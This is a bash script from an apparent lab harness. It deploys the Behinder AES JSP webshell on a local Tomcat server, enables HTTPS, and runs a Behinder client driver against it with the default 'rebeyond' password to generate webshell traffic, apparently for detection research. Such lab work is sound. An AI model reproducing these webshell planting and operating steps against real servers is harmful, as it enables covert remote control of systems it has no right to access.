#!/bin/bash
# Behinder scenario: deploy the default AES JSP webshell (memory-shell-like
# variant with Connection: close) on Tomcat and drive real Behinder client
# traffic. Run by framework/harness/run_scenario_inner.sh.
set +e

OUT="${OUT:-/lab/src/out}"
mkdir -p "$OUT"
TC=/opt/tomcat

cp /lab/bin/extract_v4.0.7/server/default_aes/shell.jsp "$TC/webapps/ROOT/shell.jsp"
sed "2i <% response.setHeader(\"Connection\",\"close\"); %>" \
  /lab/bin/extract_v4.0.7/server/default_aes/shell.jsp > "$TC/webapps/ROOT/shell_close.jsp"
# enable the HTTPS connector on 8443
sed -i 's#</Service>#<Connector port="8443" protocol="org.apache.coyote.http11.Http11NioProtocol" SSLEnabled="true" scheme="https" secure="true" sslProtocol="TLS" keystoreFile="conf/keystore.jks" keystorePass="changeit" />\n  </Service>#' "$TC/conf/server.xml"
CATALINA_HOME="$TC" "$TC/bin/catalina.sh" start >/dev/null 2>&1

READY=0
for i in $(seq 1 60); do
  curl -sk -o /dev/null https://127.0.0.1:8443/
  if [ $? -eq 0 ]; then READY=1; break; fi
  sleep 1
done
echo "tomcat_ready=$READY" > "$OUT/behinder.log"
sleep 2

cd /lab
cp /lab/bin/extract_v4.0.7/data.db /lab/data.db
mkdir -p /lab/classes
javac -encoding UTF-8 -cp /lab/bin/extract_v4.0.7/Behinder.jar -d /lab/classes \
  /lab/src/framework/drivers/Driver.java >> "$OUT/behinder.log" 2>&1

echo "== Behinder memory-shell mode (6 ops) ==" >> "$OUT/behinder.log"
java -cp /lab/classes:/lab/bin/extract_v4.0.7/Behinder.jar Driver \
  https://127.0.0.1:8443/shell_close.jsp rebeyond jsp 6 \
  >> "$OUT/behinder.log" 2>&1

sleep 3
echo "behinder scenario done" >> "$OUT/behinder.log"
exit 0
